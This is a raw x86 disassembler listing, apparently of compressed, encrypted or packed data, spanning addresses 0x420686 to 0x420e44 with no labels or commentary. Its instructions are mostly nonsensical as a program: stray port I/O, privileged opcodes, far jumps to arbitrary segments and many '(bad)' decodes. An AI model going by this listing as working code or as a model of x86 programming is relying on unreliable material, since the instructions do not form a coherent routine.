  420686:	scas   eax,DWORD PTR es:[edi]
  420687:	cs aaa 
  420689:	push   es
  42068a:	add    ecx,DWORD PTR [ebp-0x6c]
  42068d:	xor    eax,0x77329ccf
  420692:	outs   dx,DWORD PTR ds:[esi]
  420693:	sub    al,0xae
  420695:	nop
  420696:	shr    DWORD PTR [edi-0x16],1
  420699:	mov    eax,0x7aa30f0a
  42069e:	loope  0x42062e
  4206a0:	ret    0xfc18
  4206a3:	pop    ebx
  4206a4:	xchg   ebx,eax
  4206a5:	dec    eax
  4206a6:	fisttp DWORD PTR [ebp+0x7a006e4c]
  4206ac:	pop    es
  4206ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ae:	lods   al,BYTE PTR ds:[esi]
  4206af:	jp     0x42069a
  4206b1:	loopne 0x4206e2
  4206b3:	push   ss
  4206b4:	imul   ecx,DWORD PTR [ecx],0x417e4353
  4206ba:	inc    esp
  4206bb:	mov    al,ds:0xc4510e6
  4206c0:	sbb    al,0xa5
  4206c2:	nop
  4206c3:	mov    dl,0xda
  4206c5:	bound  edx,QWORD PTR [ecx-0x7a]
  4206c8:	daa    
  4206c9:	shr    DWORD PTR [edx-0x3b],0x77
  4206cd:	mov    ebx,0x9af582c2
  4206d2:	jge    0x4206e6
  4206d4:	pop    ss
  4206d5:	stos   DWORD PTR es:[edi],eax
  4206d6:	add    dh,al
  4206d8:	mov    dh,BYTE PTR [esi-0x6c65483e]
  4206de:	aad    0x6
  4206e0:	cld    
  4206e1:	repnz mov al,ds:0x6f6fc7a2
  4206e7:	popa   
  4206e8:	dec    esp
  4206e9:	pushf  
  4206ea:	out    0xc1,eax
  4206ec:	dec    esi
  4206ed:	ins    DWORD PTR es:[edi],dx
  4206ee:	nop
  4206ef:	shl    BYTE PTR [ecx+0x47],1
  4206f2:	push   0x43693980
  4206f7:	cdq    
  4206f8:	mov    DWORD PTR [esp+ebx*8+0x262abca2],ecx
  4206ff:	cs lahf 
  420701:	rcr    DWORD PTR [esi-0x55],cl
  420704:	mov    cl,0xe6
  420706:	pop    ss
  420707:	push   esi
  420708:	cmp    DWORD PTR [ecx+ebx*2-0x7587a989],eax
  42070f:	pop    DWORD PTR [esp+eax*2]
  420712:	pusha  
  420713:	loope  0x420732
  420715:	push   ss
  420716:	test   BYTE PTR [eax],0x6c
  420719:	ss cli 
  42071b:	and    DWORD PTR [ebx],esi
  42071d:	and    dl,BYTE PTR [ebp+0x25c77ed7]
  420723:	push   es
  420724:	and    al,0xf0
  420726:	sbb    al,0x6b
  420728:	cmp    esp,edi
  42072a:	pusha  
  42072b:	les    ebp,FWORD PTR [ecx+0x219b396e]
  420731:	pop    ss
  420732:	mov    ah,0xda
  420734:	lock cmp DWORD PTR [ebp-0x7f],edx
  420738:	push   ebx
  420739:	and    DWORD PTR [ebx-0x4e],0x3768c06d
  420740:	jg     0x420748
  420742:	mov    bh,0xc2
  420744:	test   bh,bh
  420746:	mov    bl,BYTE PTR [edi+0x57]
  420749:	shr    BYTE PTR [edi-0xaab80a],cl
  42074f:	mov    ah,0xea
  420751:	push   esi
  420752:	sti    
  420753:	adc    eax,0x9fff90bb
  420758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42075a:	ja     0x420712
  42075c:	jno    0x4207a7
  42075e:	or     ecx,DWORD PTR ds:0x833cb4df
  420764:	and    edx,DWORD PTR [eax-0x5a]
  420767:	nop
  420768:	mov    dl,BYTE PTR [edx+0x33c27ece]
  42076e:	popf   
  42076f:	je     0x42076f
  420771:	xchg   ebx,eax
  420772:	js     0x420767
  420774:	jp     0x42074b
  420776:	fnstcw WORD PTR [ebp-0xa]
  420779:	clc    
  42077a:	and    DWORD PTR [edi-0x7cfe018],esi
  420780:	adc    al,0x68
  420782:	sub    esp,DWORD PTR [edx]
  420784:	addr16 jbe 0x420740
  420787:	icebp  
  420788:	xchg   esi,eax
  420789:	dec    eax
  42078a:	adc    cl,bh
  42078c:	nop
  42078d:	fwait
  42078e:	sbb    al,0x51
  420790:	rol    DWORD PTR [eax],1
  420792:	and    dh,al
  420794:	test   DWORD PTR [edi+0x58a79143],0x89e48b85
  42079e:	or     BYTE PTR [ebx-0x5d],dh
  4207a1:	arpl   ax,di
  4207a3:	push   ss
  4207a4:	(bad)  
  4207a5:	cmp    eax,0x8ab18ec3
  4207aa:	loopne 0x420739
  4207ac:	and    DWORD PTR [esi],ebx
  4207ae:	adc    DWORD PTR [eax-0x786a3dfc],edi
  4207b4:	pop    es
  4207b5:	in     eax,dx
  4207b6:	inc    edx
  4207b7:	cmp    DWORD PTR [ebx+0x4ed2d0e0],0xc4f97ef6
  4207c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207c2:	mov    ds:0x23fd347d,al
  4207c7:	push   ebx
  4207c8:	mov    ecx,0xe388cd8b
  4207cd:	xor    eax,0x9c46f081
  4207d2:	xor    DWORD PTR [ecx],edx
  4207d4:	xchg   eax,edx
  4207d6:	xor    BYTE PTR [ebx-0x10],bh
  4207d9:	push   ecx
  4207da:	cld    
  4207db:	or     dl,BYTE PTR [eax]
  4207dd:	out    0x8d,eax
  4207df:	imul   ecx,DWORD PTR [ebx-0x72],0x55
  4207e3:	jo     0x420824
  4207e5:	mov    al,0xad
  4207e7:	aam    0x85
  4207e9:	inc    ebp
  4207ea:	imul   esp,DWORD PTR [edi-0x682b4ac0],0xfffffffe
  4207f1:	lds    esi,FWORD PTR [edi+0x4bec535c]
  4207f7:	sbb    DWORD PTR [ebp+0x43dde9a3],0x6b
  4207fe:	inc    edx
  4207ff:	xor    bh,BYTE PTR [esi-0x481f0b8f]
  420805:	int    0xed
  420807:	mov    al,ds:0x34443836
  42080c:	jno    0x42079d
  42080e:	out    0x3f,eax
  420810:	xor    al,0x1a
  420812:	xchg   esi,eax
  420813:	aad    0xf2
  420815:	inc    ebx
  420816:	dec    ebx
  420817:	cs jne 0x4207ae
  42081a:	pushf  
  42081b:	cmc    
  42081c:	mov    ch,0x62
  42081e:	scas   al,BYTE PTR es:[edi]
  42081f:	jae    0x42084c
  420821:	mov    BYTE PTR [eax+0x50],dl
  420824:	aad    0x0
  420826:	add    BYTE PTR [eax],al
  420828:	add    BYTE PTR [eax],al
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x5f04921e
  420837:	std    
  420838:	xor    edi,DWORD PTR [edi]
  42083a:	pop    esp
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	add    DWORD PTR [esi],0x0
  420841:	add    BYTE PTR [edi-0x79],bh
  420844:	idiv   DWORD PTR [edx]
  420846:	call   0xf0474cae
  42084b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084c:	int3   
  42084d:	adc    ebp,ecx
  42084f:	(bad)  
  420850:	je     0x420835
  420852:	sbb    eax,0x6dcd3665
  420857:	cmp    dl,ah
  420859:	(bad)  
  42085a:	test   al,0x23
  42085c:	mov    al,0xbd
  42085e:	mov    ebx,0x28bc1cc0
  420863:	mov    ebx,0xe3c72c73
  420868:	sbb    al,0x3a
  42086a:	leave  
  42086b:	push   es
  42086c:	enter  0xee24,0x85
  420870:	jmp    0x420856
  420872:	or     DWORD PTR [edi],ecx
  420874:	jo     0x420883
  420876:	mov    gs,WORD PTR ds:0x1ad2abc7
  42087c:	or     BYTE PTR [ecx+0x4c16d1b1],dh
  420882:	pop    edi
  420883:	jno    0x42089c
  420885:	sbb    BYTE PTR [ebx+esi*8],dl
  420888:	sub    bh,BYTE PTR ds:0x4d99405
  42088e:	loope  0x420867
  420890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420891:	and    BYTE PTR [ebx+0x7b],cl
  420894:	stos   DWORD PTR es:[edi],eax
  420895:	aad    0xf2
  420897:	popa   
  420898:	std    
  420899:	out    0x39,eax
  42089b:	push   edi
  42089c:	cmp    bl,BYTE PTR [ebp+0x17]
  42089f:	cs mov esp,0x3aae4109
  4208a5:	mov    ds:0x24650fd9,eax
  4208aa:	mov    ds:0x429784fa,eax
  4208af:	pop    edx
  4208b0:	lods   eax,DWORD PTR ds:[esi]
  4208b1:	(bad)  
  4208b2:	in     eax,dx
  4208b3:	popf   
  4208b4:	add    al,BYTE PTR [ecx+0x41c8075e]
  4208ba:	jmp    DWORD PTR [edx-0x19]
  4208bd:	sbb    eax,0x86894613
  4208c2:	pop    edi
  4208c3:	adc    dh,BYTE PTR [eax+0x61b77372]
  4208c9:	inc    eax
  4208ca:	rcl    BYTE PTR [esp+eax*2-0x690af294],cl
  4208d1:	pop    eax
  4208d2:	dec    ebx
  4208d3:	scas   al,BYTE PTR es:[edi]
  4208d4:	push   cs
  4208d5:	in     al,0x7d
  4208d7:	add    ebx,eax
  4208d9:	loopne 0x42088f
  4208db:	adc    DWORD PTR [eax],ebp
  4208dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208de:	mov    esp,0xbc6bd0d9
  4208e3:	into   
  4208e4:	cs sbb eax,0x564b1d37
  4208ea:	jmp    0x6e9b:0x818c6ded
  4208f1:	jnp    0x420939
  4208f3:	sub    eax,0x24e74f41
  4208f8:	sbb    ch,BYTE PTR [ebx+0x2c]
  4208fb:	sub    dh,al
  4208fd:	mov    dh,BYTE PTR [edi]
  4208ff:	cmp    eax,DWORD PTR [ecx+ebp*2+0x41]
  420903:	lods   al,BYTE PTR ds:[esi]
  420904:	ret    
  420905:	sbb    eax,0x12f970a7
  42090a:	and    eax,DWORD PTR [edx]
  42090c:	cs or  ah,dh
  42090f:	stc    
  420910:	mov    eax,DWORD PTR [edx-0x26]
  420913:	lahf   
  420914:	ds cmc 
  420916:	dec    edi
  420917:	pop    ds
  420918:	mov    edx,0x49a57db8
  42091d:	mov    eax,ds:0x5656cb5b
  420922:	stos   DWORD PTR es:[edi],eax
  420923:	les    edx,FWORD PTR [ebx]
  420925:	inc    ebp
  420926:	pushf  
  420927:	mov    ebx,0x84cc79ba
  42092c:	outs   dx,BYTE PTR ds:[esi]
  42092d:	and    eax,DWORD PTR [edi*1-0x1a84bd4f]
  420934:	aam    0x9b
  420936:	or     DWORD PTR [esi-0x68],0x12
  42093a:	sub    DWORD PTR [ecx-0x6a],ebp
  42093d:	mov    dl,0xcc
  42093f:	iret   
  420940:	fidiv  DWORD PTR ds:[eax+edx*2]
  420944:	lock inc esi
  420946:	inc    esp
  420947:	inc    eax
  420948:	bound  eax,QWORD PTR ds:0x7a78144a
  42094e:	push   0xffffffbb
  420950:	js     0x4208fe
  420952:	xor    bl,ah
  420954:	jmp    0x94cb:0xa7c75cd6
  42095b:	dec    esi
  42095c:	iret   
  42095d:	ret    
  42095e:	fild   QWORD PTR [edi-0x62162db]
  420964:	jp     0x420997
  420966:	loop   0x420953
  420968:	pop    edi
  420969:	adc    al,0x87
  42096b:	xchg   esi,eax
  42096c:	or     al,0xef
  42096e:	fwait
  42096f:	or     al,0xe
  420971:	dec    edi
  420972:	cmp    esi,esi
  420974:	add    al,0xd0
  420976:	cmp    esi,DWORD PTR [edi+eiz*2]
  420979:	mov    dl,0xf9
  42097b:	fwait
  42097c:	lahf   
  42097d:	mov    bl,0x36
  42097f:	sbb    al,0x9
  420981:	xor    esp,esp
  420983:	ss mov dl,dl
  420986:	adc    dh,BYTE PTR [eax]
  420988:	js     0x4209c2
  42098a:	das    
  42098b:	sti    
  42098c:	call   0xccc6:0x7041e09e
  420993:	sbb    al,0x75
  420995:	aad    0x61
  420997:	pop    ebp
  420998:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420999:	jnp    0x4209a7
  42099b:	mov    eax,0x15f0de13
  4209a0:	sub    al,0xa3
  4209a2:	out    0xd0,eax
  4209a4:	(bad)  
  4209a5:	je     0x420a07
  4209a7:	sahf   
  4209a8:	xor    eax,0xb4c987a9
  4209ad:	and    eax,0x4984e898
  4209b2:	dec    ebp
  4209b3:	mov    al,ds:0x3659a24b
  4209b8:	pop    eax
  4209b9:	xor    bh,BYTE PTR [ebp+0x3f]
  4209bc:	leave  
  4209bd:	cmp    al,0xab
  4209bf:	into   
  4209c0:	sahf   
  4209c1:	scas   al,BYTE PTR es:[edi]
  4209c2:	pushf  
  4209c3:	scas   eax,DWORD PTR es:[edi]
  4209c4:	mov    edx,0xbc7104b6
  4209c9:	push   0x4692db60
  4209ce:	push   ds
  4209cf:	les    edi,FWORD PTR [ecx]
  4209d1:	push   ecx
  4209d2:	adc    BYTE PTR [ebx+0x1ce5cc71],0x94
  4209d9:	jp     0x420a3b
  4209db:	cmp    esi,ebp
  4209dd:	adc    DWORD PTR [esp+edx*8-0x61fc4622],esp
  4209e4:	ds pop ecx
  4209e6:	cld    
  4209e7:	call   0x1d0a8891
  4209ec:	mov    eax,0x3021182
  4209f1:	sub    al,0x75
  4209f3:	jmp    0x91eb:0x2c4f61ce
  4209fa:	sbb    DWORD PTR [ebx+0x48],ecx
  4209fd:	cmp    dl,BYTE PTR [ebx+edi*4]
  420a00:	adc    bl,BYTE PTR [edi-0x5134198]
  420a06:	jecxz  0x420a75
  420a08:	lea    esi,[edi]
  420a0a:	dec    esp
  420a0b:	and    BYTE PTR [ecx+edi*8+0x1c65e7f2],bh
  420a12:	std    
  420a13:	sbb    DWORD PTR [eax+0x2e],ebx
  420a16:	popa   
  420a17:	or     eax,0x2adb6c8b
  420a1c:	or     DWORD PTR [esi+0x6c2a2455],edx
  420a22:	int    0xcf
  420a24:	xchg   esp,eax
  420a25:	inc    esi
  420a26:	out    dx,al
  420a27:	xchg   esp,eax
  420a28:	(bad)  
  420a29:	push   ebx
  420a2a:	mov    al,ds:0x69d4b5b6
  420a2f:	xor    ch,ah
  420a31:	xor    eax,edx
  420a33:	mov    ebp,0x1e6c6ab2
  420a38:	lods   al,BYTE PTR ds:[esi]
  420a39:	mov    ebp,0x233cf4cf
  420a3e:	stc    
  420a3f:	push   ecx
  420a40:	sub    BYTE PTR [eax],0xba
  420a43:	xor    eax,0xefa9ff46
  420a48:	adc    DWORD PTR [edx-0x26],esi
  420a4b:	lock push 0xfea075e2
  420a51:	mov    gs,WORD PTR [esi+eax*8+0x7e]
  420a55:	fucomp st(4)
  420a57:	and    DWORD PTR [edi-0x2f],0x76f1f936
  420a5e:	out    dx,al
  420a5f:	xchg   edx,eax
  420a60:	pop    ecx
  420a61:	push   0x1a
  420a63:	test   eax,0x2fe97f36
  420a68:	add    ch,BYTE PTR [edi+ebp*1-0x4afba4ea]
  420a6f:	ds mov cl,0xd
  420a72:	fwait
  420a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a74:	mov    bl,0x12
  420a76:	push   ebx
  420a77:	repnz fadd st,st(0)
  420a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a7b:	cmc    
  420a7c:	inc    ecx
  420a7d:	add    esi,DWORD PTR [esi]
  420a7f:	dec    edi
  420a80:	out    0x7d,eax
  420a82:	jno    0x420aaa
  420a84:	into   
  420a85:	inc    edx
  420a86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a87:	add    eax,0xadedb1b4
  420a8c:	jo     0x420ae6
  420a8e:	xor    dh,cl
  420a90:	out    dx,al
  420a91:	jge    0x420a56
  420a93:	(bad)  [ebx-0x4f]
  420a96:	pop    ebp
  420a97:	scas   al,BYTE PTR es:[edi]
  420a98:	mov    al,0x39
  420a9a:	outs   dx,DWORD PTR ds:[esi]
  420a9b:	es fs stc 
  420a9e:	cdq    
  420a9f:	addr16 iret 
  420aa1:	mov    al,ds:0x5e3d2c57
  420aa6:	fdivp  st(3),st
  420aa8:	add    al,BYTE PTR [ecx+eax*1-0x3d]
  420aac:	jle    0x420ab7
  420aae:	push   edi
  420aaf:	add    al,0x70
  420ab1:	mov    ebx,0x91e33864
  420ab6:	sbb    ah,dl
  420ab8:	push   ebx
  420ab9:	stos   DWORD PTR es:[di],eax
  420abb:	(bad)  
  420abc:	dec    BYTE PTR [ebx+eax*1+0xf]
  420ac0:	in     al,0x8
  420ac2:	nop
  420ac3:	loope  0x420b2d
  420ac5:	pop    ecx
  420ac6:	ret    
  420ac7:	mov    al,ds:0xf17d3ea8
  420acc:	xchg   BYTE PTR [esi+0x61],dl
  420acf:	mov    ebp,0x2682857b
  420ad4:	frstor [ebp+0x1b18deb3]
  420ada:	int    0x9
  420adc:	icebp  
  420add:	pop    edi
  420ade:	bound  ebx,QWORD PTR [ebp-0x20e69258]
  420ae4:	dec    ecx
  420ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ae6:	ret    0x4ea9
  420ae9:	pusha  
  420aea:	loope  0x420b42
  420aec:	mov    ebp,0xcabd9e00
  420af1:	xchg   DWORD PTR [edi-0x394b3810],edx
  420af7:	pop    ebp
  420af8:	jge    0x420aa8
  420afa:	rcl    esi,1
  420afc:	sbb    edx,edi
  420afe:	mov    ds:0xea49236f,al
  420b03:	jne    0x420b34
  420b05:	mov    ch,0x20
  420b07:	into   
  420b08:	pop    ecx
  420b09:	jne    0x420af1
  420b0b:	fcomip st,st(0)
  420b0d:	mov    edi,0x4b3c7096
  420b12:	fcmovu st,st(1)
  420b14:	mov    cl,0xef
  420b16:	inc    esi
  420b17:	sti    
  420b18:	ins    BYTE PTR es:[edi],dx
  420b19:	mov    bl,BYTE PTR [edi+0x6461f796]
  420b1f:	inc    edx
  420b20:	mov    dh,0x95
  420b22:	xor    eax,0x7ba43c80
  420b27:	and    al,0x69
  420b29:	dec    esi
  420b2a:	xchg   esp,eax
  420b2b:	push   gs
  420b2d:	sub    BYTE PTR [ecx+eiz*2-0x2d],cl
  420b31:	mov    edx,0x36b37c75
  420b36:	jmp    0x7e96b80e
  420b3b:	sbb    al,BYTE PTR [edi]
  420b3d:	xor    bh,0xd7
  420b40:	out    dx,eax
  420b41:	aas    
  420b42:	shl    dl,1
  420b44:	add    eax,0x24efe92a
  420b49:	sub    eax,0x10e8d8ab
  420b4e:	xor    al,0x9a
  420b50:	mov    DWORD PTR [edx],esi
  420b52:	xor    bh,cl
  420b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b55:	jmp    0xadbc:0xe5e5a01d
  420b5c:	add    eax,0xd0591bf0
  420b61:	mov    esi,0xbc7630ea
  420b66:	ins    BYTE PTR es:[edi],dx
  420b67:	in     eax,0x11
  420b69:	lods   eax,DWORD PTR ds:[esi]
  420b6a:	cli    
  420b6b:	gs and bl,cl
  420b6e:	jge    0x420bb9
  420b70:	popa   
  420b71:	daa    
  420b72:	push   ss
  420b73:	mov    es,WORD PTR [esi-0x53]
  420b76:	dec    esp
  420b77:	pop    ds
  420b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b79:	dec    esi
  420b7a:	sub    al,0xd7
  420b7c:	scas   eax,DWORD PTR es:[edi]
  420b7d:	(bad)
  420b80:	add    al,BYTE PTR [ebp+0x4e17e94]
  420b86:	add    cl,ch
  420b88:	call   0xdc0c:0x3cd16f60
  420b8f:	jmp    0x420b5e
  420b91:	aaa    
  420b92:	push   esi
  420b93:	dec    esi
  420b94:	or     DWORD PTR [ecx+0x34a67895],ecx
  420b9a:	js     0x420c07
  420b9c:	je     0x420b59
  420b9e:	or     DWORD PTR [edx+edi*8],0xffffff9d
  420ba2:	out    0x7b,al
  420ba4:	aas    
  420ba5:	dec    eax
  420ba6:	imul   esi,DWORD PTR [esp+eiz*2+0x5e3903b],0xffffffed
  420bae:	lds    ebp,FWORD PTR [edi]
  420bb0:	add    al,0xfc
  420bb2:	xchg   BYTE PTR [ecx+0x56],bl
  420bb5:	inc    ebx
  420bb6:	test   al,0xc6
  420bb8:	mov    eax,0xc0581fa5
  420bbd:	mov    ds:0x48f80e98,al
  420bc2:	push   edx
  420bc3:	push   0xffffffc0
  420bc5:	cld    
  420bc6:	loop   0x420b5a
  420bc8:	and    dh,dl
  420bca:	pop    ecx
  420bcb:	mov    edi,0xac56d00a
  420bd0:	mov    eax,0xb06a3850
  420bd5:	popf   
  420bd6:	mov    eax,ds:0x80db167d
  420bdb:	aas    
  420bdc:	out    0x90,al
  420bde:	sub    DWORD PTR [ecx],edx
  420be0:	push   edi
  420be1:	xchg   edx,eax
  420be2:	mov    ?,esi
  420be4:	sti    
  420be5:	dec    esp
  420be6:	in     eax,0x59
  420be8:	popa   
  420be9:	scas   al,BYTE PTR es:[edi]
  420bea:	dec    ecx
  420beb:	or     BYTE PTR [ecx-0x942f1f6],0xd7
  420bf2:	pop    esp
  420bf3:	outs   dx,BYTE PTR ds:[esi]
  420bf4:	mov    dl,0xc1
  420bf6:	xchg   ecx,eax
  420bf7:	ins    BYTE PTR es:[edi],dx
  420bf8:	mov    al,0xdc
  420bfa:	sub    esp,edx
  420bfc:	loop   0x420bce
  420bfe:	aaa    
  420bff:	ins    DWORD PTR es:[edi],dx
  420c00:	sbb    DWORD PTR [ebp-0x51fe9989],ecx
  420c06:	push   0xe54839d
  420c0b:	push   0xc2832f9
  420c10:	or     al,BYTE PTR [edx+0x54a77503]
  420c16:	adc    BYTE PTR [eax+0x35ecdb70],dl
  420c1c:	push   DWORD PTR [edi-0x73]
  420c1f:	or     DWORD PTR [ebp-0x4f],0x4140bbe1
  420c26:	int3   
  420c27:	(bad)  
  420c28:	sbb    BYTE PTR [esp+eiz*4],cl
  420c2b:	lock in al,dx
  420c2d:	push   edx
  420c2e:	mov    cl,0xdd
  420c31:	push   es
  420c32:	pop    eax
  420c33:	xor    BYTE PTR [edx+esi*2+0x6c],0xbc
  420c38:	das    
  420c39:	call   DWORD PTR ds:0xdca9e3ce
  420c3f:	aad    0x9f
  420c41:	mov    eax,0xa9871196
  420c46:	mov    BYTE PTR [esi-0x64],dh
  420c49:	cmp    eax,0xe5ca9233
  420c4e:	call   0x3f62:0x286c0aec
  420c55:	lahf   
  420c56:	mov    ah,0x60
  420c58:	inc    edx
  420c59:	add    al,0xbc
  420c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c5c:	imul   edi,DWORD PTR [ebx],0xffffffd9
  420c5f:	rcr    DWORD PTR [ebx],1
  420c61:	pop    esi
  420c62:	dec    ecx
  420c63:	and    al,0x24
  420c65:	push   edi
  420c66:	jmp    0xb413:0xc36ba761
  420c6d:	jne    0x420c21
  420c6f:	cmc    
  420c70:	fcom   QWORD PTR ds:0xd4e343e7
  420c76:	lea    esp,[eax+0x6d]
  420c79:	inc    edx
  420c7a:	mov    ebp,0x5109424d
  420c7f:	gs out dx,al
  420c81:	push   cs
  420c82:	fsub   QWORD PTR [ebx]
  420c84:	push   0x3a
  420c86:	into   
  420c87:	rdmsr  
  420c89:	mov    dh,0xb0
  420c8b:	je     0x420ccf
  420c8d:	outs   dx,DWORD PTR ds:[esi]
  420c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c8f:	cmc    
  420c90:	add    dl,ah
  420c92:	adc    BYTE PTR [ecx-0x48],0x52
  420c96:	dec    eax
  420c97:	(bad)  
  420c98:	out    0x6e,eax
  420c9a:	mov    cl,0x36
  420c9c:	add    al,0x94
  420c9e:	pop    ebx
  420c9f:	push   ds
  420ca0:	xchg   edi,eax
  420ca1:	push   esi
  420ca2:	je     0x420ca5
  420ca4:	or     eax,0x227f1178
  420ca9:	or     BYTE PTR [esi+0x4b],0x64
  420cad:	mov    ah,0x8
  420caf:	dec    esi
  420cb0:	lods   eax,DWORD PTR ds:[esi]
  420cb1:	mov    ecx,0x5f69eb2c
  420cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cb7:	dec    esi
  420cb8:	adc    DWORD PTR [ebp-0x7320dc05],0x64a5f62e
  420cc2:	xor    ah,ah
  420cc4:	arpl   WORD PTR [ecx+0x79],ax
  420cc7:	pop    ds
  420cc8:	(bad)  
  420cc9:	fld    TBYTE PTR [eax+0x10]
  420ccc:	adc    BYTE PTR ds:[esi-0x5c],ah
  420cd0:	push   esp
  420cd1:	ss ret 0x1793
  420cd5:	mov    ds:0xb67c66de,ax
  420cdb:	mov    esi,0x8f7deab3
  420ce0:	out    dx,eax
  420ce1:	hlt    
  420ce2:	jmp    0xc60e507c
  420ce7:	inc    ebx
  420ce8:	jecxz  0x420ca1
  420cea:	shl    al,1
  420cec:	popw   es
  420cee:	pop    es
  420cef:	fnsave [edi]
  420cf1:	out    0xdb,eax
  420cf3:	and    ch,BYTE PTR [eax-0x13]
  420cf6:	callw  0x2b83
  420cfa:	lods   al,BYTE PTR ds:[esi]
  420cfb:	xchg   ebx,esi
  420cfd:	repz fldenv [edi+eiz*4]
  420d01:	loopne 0x420ceb
  420d03:	fucomp st(3)
  420d05:	inc    edx
  420d06:	mov    edi,0x398b1c86
  420d0b:	mov    edi,0x7b6e47fc
  420d10:	outs   dx,BYTE PTR ds:[esi]
  420d11:	push   es
  420d12:	mov    dl,0x33
  420d14:	test   al,0x4d
  420d16:	lds    ebp,FWORD PTR [ebx]
  420d18:	aad    0xe0
  420d1a:	cmp    eax,0xcd4f7b72
  420d1f:	adc    ecx,DWORD PTR [ebx-0x3a8f70b]
  420d25:	fstp   QWORD PTR [ebx]
  420d27:	out    0x26,al
  420d29:	jmp    0x5d2:0xe31530f4
  420d30:	ins    DWORD PTR es:[edi],dx
  420d31:	inc    esi
  420d32:	nop
  420d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d34:	into   
  420d35:	jecxz  0x420d03
  420d37:	dec    ecx
  420d38:	or     BYTE PTR [esp+ecx*4+0x5f71c762],dl
  420d3f:	or     BYTE PTR [edx-0x4eba73ce],dh
  420d45:	call   0x3342c541
  420d4a:	sub    BYTE PTR fs:0xb912351f,dh
  420d51:	pop    edi
  420d52:	(bad)  
  420d53:	adc    al,0x5c
  420d55:	xlat   BYTE PTR ds:[ebx]
  420d56:	jmp    0x420d12
  420d58:	sub    dh,BYTE PTR [eax+edx*1+0x1d]
  420d5c:	cli    
  420d5d:	mov    edx,0xa1fb8434
  420d62:	mov    bh,BYTE PTR cs:[ebx+0x67]
  420d66:	mov    bl,0xdc
  420d68:	out    0x80,eax
  420d6a:	dec    ebp
  420d6b:	dec    edi
  420d6c:	icebp  
  420d6d:	ret    0x3b07
  420d70:	clc    
  420d71:	leave  
  420d72:	pop    ebx
  420d73:	inc    eax
  420d74:	imul   DWORD PTR [esi]
  420d76:	add    al,0x61
  420d78:	pop    edi
  420d79:	pop    ecx
  420d7a:	jb     0x420da9
  420d7c:	js     0x420dd1
  420d7e:	add    al,0xbf
  420d80:	aad    0x41
  420d82:	push   ebx
  420d83:	repnz inc edx
  420d85:	dec    ebx
  420d86:	pop    edx
  420d87:	and    dh,bh
  420d89:	stos   BYTE PTR es:[edi],al
  420d8a:	pop    ebx
  420d8b:	into   
  420d8c:	jmp    0x1540:0xbe882d1d
  420d93:	and    al,0x87
  420d95:	leave  
  420d96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d97:	nop
  420d98:	add    dl,ah
  420d9a:	(bad)  
  420d9b:	jge    0x420d56
  420d9d:	hlt    
  420d9e:	dec    ebx
  420d9f:	cld    
  420da0:	repnz add eax,0x142a58b
  420da6:	out    dx,al
  420da7:	fcmovnu st,st(0)
  420da9:	mov    ds:0x3611e144,eax
  420dae:	and    esp,edx
  420db0:	leave  
  420db1:	les    eax,FWORD PTR [eax-0x4d]
  420db4:	and    al,0x37
  420db6:	pushf  
  420db7:	push   ebp
  420db8:	and    al,0x3c
  420dba:	test   BYTE PTR [ebx-0x63],ch
  420dbd:	cmp    eax,0x65945a5c
  420dc2:	cmp    bl,BYTE PTR ds:0xb56d0353
  420dc8:	pop    ebp
  420dc9:	test   edx,edx
  420dcb:	shr    DWORD PTR [edx+0x546f29ca],1
  420dd1:	ja     0x420ddd
  420dd3:	cmp    DWORD PTR [eax+0x57],esi
  420dd6:	test   al,ah
  420dd8:	xchg   ebp,eax
  420dd9:	(bad)  
  420dda:	sti    
  420ddb:	push   ds
  420ddc:	popa   
  420ddd:	pop    eax
  420dde:	mov    ebp,0x21052120
  420de3:	cmp    BYTE PTR [edx],0x7f
  420de6:	pop    esp
  420de7:	lods   eax,DWORD PTR ds:[esi]
  420de8:	inc    eax
  420de9:	aas    
  420dea:	adc    ebx,edi
  420dec:	rol    DWORD PTR [ecx],cl
  420dee:	dec    esi
  420def:	xlat   BYTE PTR ds:[ebx]
  420df0:	movaps XMMWORD PTR [edi],xmm6
  420df3:	and    al,0xe3
  420df5:	std    
  420df6:	cwde   
  420df7:	push   es
  420df8:	mov    al,ds:0xa7e7e3a3
  420dfd:	(bad)
  420e01:	gs ret 
  420e03:	mov    ebp,0x2e71d7a1
  420e08:	(bad)  
  420e09:	push   edx
  420e0a:	or     BYTE PTR [edi-0x2d],dl
  420e0d:	mov    eax,ds:0x3cf65266
  420e12:	jmp    0xbb2b8a23
  420e17:	mov    ecx,0x9d4c26b9
  420e1c:	xchg   ecx,ecx
  420e1e:	ret    0x64fa
  420e21:	cwde   
  420e22:	xchg   DWORD PTR [edx+ecx*1-0x3e8a007],edi
  420e29:	das    
  420e2a:	pusha  
  420e2b:	push   0xffffffc2
  420e2d:	icebp  
  420e2e:	cmp    eax,0xb58475f3
  420e33:	dec    ecx
  420e34:	push   edi
  420e35:	ror    BYTE PTR [ebx],1
  420e37:	fs jo  0x420e03
  420e3a:	cmp    bl,al
  420e3c:	lahf   
  420e3d:	addr16 je 0x420e27
  420e40:	jnp    0x420dd5
  420e42:	aam    0xc
  420e44:	dec    esp
